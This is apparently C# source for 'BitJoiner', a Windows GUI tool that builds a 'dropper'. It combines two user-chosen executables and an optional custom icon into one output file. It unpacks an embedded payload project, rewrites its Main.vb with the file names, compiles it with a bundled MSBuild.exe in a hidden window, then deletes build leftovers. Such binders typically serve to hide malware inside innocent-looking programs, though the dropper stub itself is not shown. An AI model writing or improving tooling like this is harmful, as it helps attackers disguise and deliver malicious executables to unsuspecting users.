using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO.Compression;

/*                                                                                                             
                                              ---------------------                                          
                                     --------------------------------------                                  
                                    ++++++++++-----------------------------                                  
                                    +++++++++++++++++++++++----------------                                  
                                    +++++++++++++++++++++++----------------                                  
                                    ++++++++++++++++++++#++++--------------                                  
                                    ++++++++++++++++++#####+++---------++++                                  
                                    +++++++++++++++#####+#####+++++++++++++#                                 
                                    ####################+++#####+++++++####+                                 
                               +++++++++##############+++++++###########+#+                                  
                        ++++++++++++++++++++++++++++++#+++-++++++++##+#++++---                               
                  ++++++++++++++++++++##+##+++#####++#+++++++++++++#++++#+#-+---------                       
           -+++++++++++++++++++++++++++++++##########+++#+++#++++++#+###++--------------------               
    -+++++++++++++++++++++++++++++++++++++++++++++######++#++###+++++++-------------------------------       
     ++++++#++++++++++++++++++++++++++++++++++++++++++++++++++++++++-------------------------------+++++++   
            ++++++++#+++++++++++++++++++++++++++++++++###+++++++------------------------+++++++++++          
                   +++++++++#++++++++++++++++++++++++++#+#++-------------------+++++++++++-                  
                         +++++++++++#+++++++++++++++++++#+-------------+++++++++++                           
                               ++++++++++++++#++++++++++++++-++#++++++++++++                                 
                                      ++++++++++++++++++++++++++++++                                         
                                               +++++++++++++++                                               
                                                     ++                                                      
                    < !--_____ __ __    _____ ___ _____ _____ _____ __        ____  _____ _____  -->
                    <!-- | __  |  |  |  |  |  |_  | __  |   | |   __|  |   ___|    \|   __|  |  | -->
                    <!-- | __ -|_   _|  |    -|_  |    -| | | |   __|  |__|___|  |  |   __|  |  | -->
                    <!-- |_____| |_|    |__|__|___|__|__|_|___|_____|_____|   |____/|_____|\___/  -->
*/

namespace BitJoiner
{
    public partial class Form1 : Form
    {
        private string iconFilePath;
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;


        public Form1()
        {
            InitializeComponent();
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void close_btn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimaze_btn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void file1_btn_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "EXE files|*.exe";
            openFileDialog1.Title = "Select first file!";
            openFileDialog1.FileName = "Join File [1]";


            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(openFileDialog1.FileName))
                {
                    file1_box.Text = openFileDialog1.FileName;
                } else
                {
                    MessageBox.Show("Selected file does not exists!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

        }

        private void file2_btn_Click(object sender, EventArgs e)
        {
            openFileDialog2.Filter = "EXE files|*.exe";
            openFileDialog2.Title = "Select 2nd file!";
            openFileDialog2.FileName = "Join File [2]";


            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(openFileDialog2.FileName))
                {
                    file2_box.Text = openFileDialog2.FileName;
                }
                else
                {
                    MessageBox.Show("Selected file does not exists!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void buildDropper_Btn_Click(object sender, EventArgs e)
        {
            string originalDirectory = Directory.GetCurrentDirectory();
            if (!string.IsNullOrWhiteSpace(file1_box.Text) && !string.IsNullOrWhiteSpace(file2_box.Text))
            {
                string file1Path = file1_box.Text;
                string file2Path = file2_box.Text;

                if (!File.Exists(file1Path) && !File.Exists(file2Path))
                {
                    MessageBox.Show("Files do not exist!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                try
                {
                    string payloadDirName = "payload";
                    string payloadPath = Path.Combine(Environment.CurrentDirectory, "payload.zip");
                    File.WriteAllBytes(payloadPath, PayloadRes.payload);

                    ZipFile.ExtractToDirectory(payloadPath, payloadDirName);
                    File.Delete("payload.zip");


                    string joinerDirectory = Path.Combine(Application.StartupPath, "payload", "joiner");
                    if (!Directory.Exists(joinerDirectory))
                    {
                        Directory.CreateDirectory(joinerDirectory);
                    }

                    string targetFile1Path = Path.Combine(joinerDirectory, "1.exe");
                    string targetFile2Path = Path.Combine(joinerDirectory, "2.exe");

                    File.Copy(file1Path, targetFile1Path, true);
                    File.Copy(file2Path, targetFile2Path, true);

                    string payloadDirectory = Path.Combine(Application.StartupPath, "payload");
                    Directory.SetCurrentDirectory(payloadDirectory);

                    string iconDestinationPath = Path.Combine(payloadDirectory, "icon.ico");


                    if (iconFilePath != null)
                    {
                        if (File.Exists(iconFilePath))
                        {
                            string oldIconPath = Path.Combine(payloadDirectory, "icon.ico");
                            if (File.Exists(oldIconPath))
                            {
                                File.Delete(oldIconPath);
                            }

                            File.Copy(iconFilePath, iconDestinationPath);
                        }
                    }


                    string mainVBPath = Path.Combine(payloadDirectory, "Main.vb");
                    string mainVBBakPath = Path.Combine(payloadDirectory, "Main.vb.bak");

                    if (File.Exists(mainVBPath))
                    {
                        File.Copy(mainVBPath, mainVBBakPath, true);

                        string file1Name = Path.GetFileName(joinFile1_box.Text);
                        string file2Name = Path.GetFileName(joinFile2_box.Text);

                        string mainVBContent = File.ReadAllText(mainVBPath);
                        mainVBContent = mainVBContent.Replace("runtime-bind.exe", file1Name);
                        mainVBContent = mainVBContent.Replace("\\visual-c++.exe", "\\" + file2Name);

                        File.WriteAllText(mainVBPath, mainVBContent);
                    }

                    string payloadName = outputPayload_name.Text;
                    string payloadExePath = Path.Combine(Application.StartupPath, "payload.exe");

                    string msBuildPath = Path.Combine(Application.StartupPath, "payload", "MSBuild.exe");

                    if (File.Exists(msBuildPath))
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(msBuildPath);
                        psi.WindowStyle = ProcessWindowStyle.Hidden;
                        Process process = Process.Start(psi);
                        process.WaitForExit();



                        if (File.Exists(payloadExePath))
                        {

                            string finalPayloadExePath = Path.Combine(Application.StartupPath, $"{payloadName}.exe");
                            if (File.Exists(finalPayloadExePath))
                            {
                                File.Delete(finalPayloadExePath);
                            }
                            File.Move(payloadExePath, finalPayloadExePath);

                            File.Delete(Path.Combine(Application.StartupPath, "payload.pdb"));
                            File.Delete(Path.Combine(Application.StartupPath, "payload.exe.config"));
                            Directory.SetCurrentDirectory(originalDirectory);
                            Directory.Delete("payload", true);

                            Process.Start("explorer.exe", $"/select, \"{finalPayloadExePath}\"");
                            statusLabel.Text = "STATUS: Build Successful!";
                            await Task.Delay(1000);

                            statusLabel.Text = "";
                            file1_box.Text = "";
                            file2_box.Text = "";
                        }
                        else
                        {
                            MessageBox.Show("Failed to find payload.exe!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("MSBuild.exe does not exist!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                } catch
                {
                    MessageBox.Show("Internal Error!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

            }
            else
            {
                MessageBox.Show("Please select files!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


        private void infoBtn_Click(object sender, EventArgs e)
        {
            About aboutForm = new About();
            aboutForm.Show();
        }

        private void gitBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void logoBox_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void selectIcon_btn_Click(object sender, EventArgs e)
        {
            string iconsDirectory = Path.Combine(Application.StartupPath, "icons");

            iconOpenDialog.Filter = "ICO files|*.ico";
            iconOpenDialog.Title = "Select ICON file";
            iconOpenDialog.InitialDirectory = iconsDirectory;

            if (iconOpenDialog.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(iconOpenDialog.FileName))
                {
                    iconFile_box.Image = Image.FromFile(iconOpenDialog.FileName);
                    iconFilePath = iconOpenDialog.FileName;
                }
                else
                {
                    MessageBox.Show("Selected icon-file does not exist!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Select icon-operation cancelled", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }


    }
}
